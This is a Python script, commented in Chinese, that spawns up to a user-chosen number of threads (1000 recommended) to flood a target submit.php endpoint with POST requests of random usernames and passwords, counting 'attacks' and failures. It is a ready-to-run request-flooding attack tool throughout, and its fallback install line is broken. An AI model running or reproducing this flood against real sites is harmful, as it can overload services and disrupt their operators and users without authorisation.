import os
import sys
import random
import time
import threading
try:
    import requests
except:
    os.system('pip -i https://pypi.tuna.tsinghua.edu.cn/simple')


URL = "http://[Type your url]/submit.php" # 目标地址
HEA = {
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://[Type your url]/submit.php",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1; OPPO R9tm Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043128 Safari/537.36 V1_AND_SQ_7.0.0_676_YYB_D PA QQ/7.0.0.3135 NetType/4G WebP/0.3.0 Pixel/1080"
}
i = 0  # 记录攻击次数
a = 0  # 记录失败次数

def attack():
    global i
    global a
    while True:
        username = str(random.randint(0, 99999999999))
        passwd = str(random.randint(0, 99999999999))
        # print(username+"\n"+passwd)
        data = {
            "r": "0",
            "u": username,
            "p": passwd
        }
        try:
            r = requests.post(URL, params=data, headers=HEA)  # 发送数据
        except requests.exceptions.ConnectionError:
            a = a + 1
        except Exception as e:
            a = a + 1
            print("其他错误：",e)
            break
        i = i + 1


if __name__ == '__main__':
    int1 = int(input('线程(推荐1000):'))
    print("即将开始，如需退出请按 Ctrl + C")
    time.sleep(2)
    print("线程启动中……")
    for j in range(int1):
        k = threading.Thread(target=attack)
        k.setDaemon(True)   # 把子线程设置为守护线程，主线程结束后子线程也结束
        k.start()
        b = len(threading.enumerate())
        sys.stdout.write("\r"+str(b)+" 个线程启动完毕")
        sys.stdout.flush()
    print("\n")
    while True:
        try:
            sys.stdout.write("\r攻击总数:"+str(i)+"        成功:" +str(i-a)+"   "+"失败:"+str(a))
            sys.stdout.flush()
        except KeyboardInterrupt:
            print("\n\n用户退出 ---> 程序结束！\n")
            break
